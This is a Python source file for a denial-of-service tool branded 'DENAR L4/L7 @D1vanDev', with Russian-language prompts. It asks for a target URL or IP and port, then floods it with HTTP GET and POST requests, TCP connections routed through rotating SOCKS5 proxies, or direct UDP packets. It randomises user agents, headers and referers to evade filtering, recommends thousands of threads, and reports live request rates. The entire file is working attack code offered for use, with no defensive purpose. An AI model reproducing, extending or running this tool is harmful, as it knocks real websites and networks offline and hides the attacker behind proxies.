import socket
import threading
import time
import random
import sys
import ssl
import os
from urllib.parse import urlparse
from colorama import Fore, Style, init
import socks

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
]

HEADERS_TEMPLATES = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate, br",
     "DNT": "1",
     "Upgrade-Insecure-Requests": "1"},
    
    {"Accept": "*/*",
     "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
     "Cache-Control": "no-cache",
     "Pragma": "no-cache"},
    
    {"Accept": "application/json, text/plain, */*",
     "Content-Type": "application/x-www-form-urlencoded",
     "Origin": "https://example.com",
     "Referer": "https://example.com/",
     "X-Requested-With": "XMLHttpRequest"}
]

# Все ваши прокси пример "user:password@127.0.0.1:9339"
PROXY_LIST = ["user:password@127.0.0.1:9339",
"user:password@127.0.0.1:9339"]

class D1vanDev:
    def __init__(self):
        self.running = False
        self.stats_req = 0
        self.stats_bytes = 0
        self.stats_connects = 0
        self.target_url = ""
        self.ip = ""
        self.port = 0
        self.mode = ""
        self.use_ssl = False
        self.sockets = []
        self.keep_alive = True
        self.attack_power = 10  
        self.working_proxies = []
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        self.udp_sockets = []
        self.udp_socket_lock = threading.Lock()
        self.max_udp_sockets = 50

    def parse_proxy(self, proxy_str):
        try:
            if "@" in proxy_str:
                auth, hostport = proxy_str.split("@")
                username, password = auth.split(":")
                host, port = hostport.split(":")
                return {
                    "username": username,
                    "password": password,
                    "host": host,
                    "port": int(port),
                    "full": proxy_str
                }
        except:
            return None

    def test_proxy(self, proxy_info):
        try:
            sock = socks.socksocket()
            sock.set_proxy(
                socks.SOCKS5,
                proxy_info["host"],
                proxy_info["port"],
                username=proxy_info["username"],
                password=proxy_info["password"]
            )
            sock.settimeout(3)
            sock.connect(("8.8.8.8", 53))
            sock.close()
            return True
        except:
            return False

    def find_working_proxies(self):
        print(f"{Fore.CYAN}[i] Тестирую {len(PROXY_LIST)} прокси...")
        
        working = []
        for i, proxy_str in enumerate(PROXY_LIST):
            proxy_info = self.parse_proxy(proxy_str)
            if proxy_info:
                if self.test_proxy(proxy_info):
                    working.append(proxy_info)
                    print(f"{Fore.GREEN}[✓] Прокси {i+1}/{len(PROXY_LIST)} рабочий: {proxy_info['host']}")
                else:
                    print(f"{Fore.RED}[✗] Прокси {i+1}/{len(PROXY_LIST)} не работает: {proxy_info['host']}")
        
        return working

    def get_next_proxy(self):
        with self.proxy_lock:
            if not self.working_proxies:
                return None
            proxy = self.working_proxies[self.proxy_index % len(self.working_proxies)]
            self.proxy_index += 1
            return proxy

    def create_proxy_socket(self):
        proxy = self.get_next_proxy()
        if not proxy:
            return None
        
        try:
            sock = socks.socksocket()
            sock.set_proxy(
                socks.SOCKS5,
                proxy["host"],
                proxy["port"],
                username=proxy["username"],
                password=proxy["password"]
            )
            sock.settimeout(2)
            return sock
        except:
            return None

    def get_target_info(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(Fore.RED + Style.BRIGHT + """

▓█████▄ ▓█████  ███▄    █  ▄▄▄       ██▀███  
▒██▀ ██▌▓█   ▀  ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒
░██   █▌▒███   ▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒
░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄  
░▒████▓ ░▒████▒▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░
 ░ ░  ░    ░      ░   ░ ░   ░   ▒     ░░   ░ 
   ░       ░  ░         ░       ░  ░   ░     
 ░                                           
        >>> DENAR L4/L7 @D1vanDev <<<
        """)
        
        self.working_proxies = self.find_working_proxies()
        if not self.working_proxies:
            print(f"{Fore.RED}[!] Нет рабочих прокси!")
            sys.exit(1)
        
        print(f"\n{Fore.GREEN}[+] Найдено {len(self.working_proxies)} рабочих прокси")
        print(f"{Fore.CYAN}[i] Все TCP/L7 атаки будут идти через все прокси")
        print(f"{Fore.YELLOW}[!] UDP атака будет идти напрямую\n")
        
        target = input(f"{Fore.YELLOW}[?] Введите цель (URL или IP): {Fore.WHITE}").strip()
        
        if target.startswith("http"):
            self.mode = "L7"
            parsed = urlparse(target)
            self.ip = parsed.hostname
            self.target_url = parsed.path if parsed.path else "/"
            
            if parsed.scheme == "https":
                self.port = 443
                self.use_ssl = True
            else:
                self.port = 80
                self.use_ssl = False
                
            print(f"{Fore.CYAN}[i] L7 режим: {self.ip}:{self.port} | SSL: {self.use_ssl}")
            
        else:
            self.ip = target
            self.port = int(input(f"{Fore.YELLOW}[?] Введите порт: {Fore.WHITE}"))
            print(f"{Fore.CYAN}--- L4 режимы ---")
            print("1. TCP Flood (через прокси)")
            print("2. UDP Flood (напрямую)")
            print("3. HTTP FLOOD (L7 через прокси)")
            choice = input(f"{Fore.YELLOW}[?] Режим (1/2/3): {Fore.WHITE}")
            if choice == "3":
                self.mode = "L7"
                self.target_url = "/"
                self.use_ssl = self.port == 443
            else:
                self.mode = "TCP" if choice == "1" else "UDP"

        self.threads = int(input(f"{Fore.YELLOW}[?] Потоки (рекомендуется 500-2000): {Fore.WHITE}"))
        self.attack_power = int(input(f"{Fore.YELLOW}[?] Мощность (1-100, умножает запросы): {Fore.WHITE}") or "10")

    def generate_post_data(self):
        sizes = [1024, 2048, 4096, 8192]  
        size = random.choice(sizes)
        
        data_types = [
            f"username={random.randint(100000,999999)}&password={'A'*(size-50)}",
            f"search={'x'*size}&filter=true&sort=desc",
            f"data={os.urandom(size//2).hex()}&id={random.randint(1,1000)}",
            f"query=SELECT+*+FROM+users+WHERE+id={random.randint(1,1000)}",
            f"json_data={{\"id\":{random.randint(1,1000)},\"value\":\"{'B'*(size-100)}\"}}"
        ]
        return random.choice(data_types)

    def create_http_request(self, use_post=False):
        user_agent = random.choice(USER_AGENTS)
        headers_template = random.choice(HEADERS_TEMPLATES)
        
        if use_post and random.choice([True, False]):
            method = "POST"
            data = self.generate_post_data()
            content_len = len(data)
            headers = f"Content-Length: {content_len}\r\n"
        else:
            method = "GET"
            data = ""
            headers = ""
        
        params = f"?v={random.randint(1,100000)}&cache={random.randint(1000,9999)}"
        if random.choice([True, False]):
            params += f"&ajax={random.randint(1,100)}"
        
        for key, value in headers_template.items():
            headers += f"{key}: {value}\r\n"
        
        referers = [
            f"https://{self.ip}/",
            "https://www.google.com/",
            "https://www.youtube.com/",
            "https://github.com/",
            ""
        ]
        
        if random.choice([True, False]):
            headers += f"Referer: {random.choice(referers)}\r\n"
        
        request = (f"{method} {self.target_url}{params} HTTP/1.1\r\n"
                  f"Host: {self.ip}\r\n"
                  f"User-Agent: {user_agent}\r\n"
                  f"{headers}")
        
        if method == "POST":
            request += f"\r\n{data}"
        else:
            request += "\r\n"
        
        return request.encode()

    def l7_workerD1vanDev1(self):
        while self.running:
            try:
                sock = self.create_proxy_socket()
                if not sock:
                    time.sleep(0.01)
                    continue
                
                try:
                    sock.connect((self.ip, self.port))
                    self.stats_connects += 1
                except:
                    sock.close()
                    time.sleep(0.01)
                    continue
                
                if self.use_ssl:
                    try:
                        context = ssl._create_unverified_context()
                        sock = context.wrap_socket(sock, server_hostname=self.ip)
                    except:
                        sock.close()
                        continue
                
                for _ in range(self.attack_power * 5):
                    try:
                        request = self.create_http_request(use_post=random.choice([True, False]))
                        sock.send(request)
                        self.stats_req += 1
                        self.stats_bytes += len(request)
                    except:
                        break
                
                sock.close()
                
            except:
                time.sleep(0.01)

    def l7_workerD1vanDev2(self):
        socket_pool = []
        requests_per_connection = random.randint(5, 20)
        
        for _ in range(min(3, len(self.working_proxies))):
            try:
                sock = self.create_proxy_socket()
                if sock:
                    sock.settimeout(5)
                    
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.ip)
                    
                    sock.connect((self.ip, self.port))
                    socket_pool.append(sock)
                    self.stats_connects += 1
            except:
                continue
        
        while self.running and socket_pool:
            for sock in socket_pool[:]:
                try:
                    for _ in range(requests_per_connection * self.attack_power):
                        request = self.create_http_request(use_post=True)
                        sock.send(request)
                        self.stats_req += 1
                        self.stats_bytes += len(request)
                        
                        if self.stats_req % 100 == 0:
                            time.sleep(0.001)
                    
                    try:
                        sock.recv(1024)
                    except:
                        pass
                        
                except:
                    try:
                        sock.close()
                        socket_pool.remove(sock)
                        
                        new_sock = self.create_proxy_socket()
                        if new_sock:
                            new_sock.settimeout(5)
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_sock = context.wrap_socket(new_sock, server_hostname=self.ip)
                            new_sock.connect((self.ip, self.port))
                            socket_pool.append(new_sock)
                            self.stats_connects += 1
                    except:
                        continue
        
        for sock in socket_pool:
            try:
                sock.close()
            except:
                pass

    def l4_udp_workerD1vanDev(self):
        with self.udp_socket_lock:
            if len(self.udp_sockets) < self.max_udp_sockets:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.settimeout(0.1)
                    self.udp_sockets.append(sock)
                except:
                    sock = None
            else:
                sock = random.choice(self.udp_sockets) if self.udp_sockets else None
        
        if not sock:
            time.sleep(0.01)
            return
        
        payloads = [os.urandom(size) for size in [512, 1024, 1450, 2048]]
        
        try:
            for _ in range(self.attack_power):
                payload = random.choice(payloads)
                sock.sendto(payload, (self.ip, self.port))
                self.stats_req += 1
                self.stats_bytes += len(payload)
        except:
            time.sleep(0.001)

    def l4_tcp_workerD1vanDev(self):
        while self.running:
            try:
                sockets = []
                for _ in range(min(10, self.attack_power)):
                    sock = self.create_proxy_socket()
                    if sock:
                        sock.settimeout(1)
                        try:
                            sock.connect((self.ip, self.port))
                            sockets.append(sock)
                            self.stats_connects += 1
                        except:
                            try:
                                sock.close()
                            except:
                                pass
                
                for s in sockets:
                    try:
                        payload = os.urandom(random.randint(128, 1024))
                        s.send(payload)
                        self.stats_req += 1
                        self.stats_bytes += len(payload)
                    except:
                        pass
                
                for s in sockets:
                    try:
                        s.close()
                    except:
                        pass
                        
                time.sleep(0.01)
                
            except:
                time.sleep(0.01)

    def monitor(self):
        print(f"\n{Fore.GREEN}[+] АТАКА ЗАПУЩЕНА! Ctrl+C для остановки")
        print(f"{Fore.CYAN}[i] Цель: {self.ip}:{self.port}")
        print(f"{Fore.CYAN}[i] Потоки: {self.threads} | Мощность: x{self.attack_power}")
        print(f"{Fore.CYAN}[i] Рабочих прокси: {len(self.working_proxies)}")
        print(f"{Fore.CYAN}[i] Режим: {self.mode}\n")
        
        last_stats = 0
        last_bytes = 0
        peak_rps = 0
        
        while self.running:
            time.sleep(1)
            
            current_req = self.stats_req
            current_bytes = self.stats_bytes
            current_connects = self.stats_connects
            
            rps = current_req - last_stats
            bps = (current_bytes - last_bytes) * 8  
            
            if rps > peak_rps:
                peak_rps = rps
            
            mbps = bps / 1_000_000
            
            print(f"\r{Fore.MAGENTA}[LIVE] RPS: {rps:,} | Peak: {peak_rps:,} | Total: {current_req:,} | "
                  f"Connects: {current_connects:,} | Speed: {mbps:.1f} Mbps | "
                  f"Прокси: {len(self.working_proxies)}", end="", flush=True)
            
            last_stats = current_req
            last_bytes = current_bytes

    def start(self):
        self.get_target_info()
        self.running = True
        
        if self.mode == "L7":
            target_func = self.l7_workerD1vanDev1  
        elif self.mode == "UDP":
            target_func = self.l4_udp_workerD1vanDev
        else:
            target_func = self.l4_tcp_workerD1vanDev
        
        print(f"\n{Fore.YELLOW}[~] Запускаю {self.threads} потоков через {len(self.working_proxies)} прокси...")
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=target_func)
            t.daemon = True
            t.start()
            threads.append(t)
            
            if i % 100 == 0:
                time.sleep(0.05)
        
        monitor_thread = threading.Thread(target=self.monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Fore.RED}[!] Атака остановлена пользователем")
            print(f"{Fore.YELLOW}[+] Итого отправлено: {self.stats_req:,} запросов")
            print(f"{Fore.YELLOW}[+] Всего соединений: {self.stats_connects:,}")
            print(f"{Fore.YELLOW}[+] Общий трафик: {self.stats_bytes / 1_000_000:.2f} MB")
            print(f"{Fore.YELLOW}[+] Использовано прокси: {len(self.working_proxies)}")
            
            for sock in self.udp_sockets:
                try:
                    sock.close()
                except:
                    pass

if __name__ == "__main__":
    try:
        try:
            import socks
        except ImportError:
            print(f"{Fore.RED}[ERROR] Не установлена библиотека PySocks!")
            print(f"{Fore.YELLOW}[INFO] Установите её: pip install PySocks")
            sys.exit(1)
            
        tool = D1vanDev()
        tool.start()
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)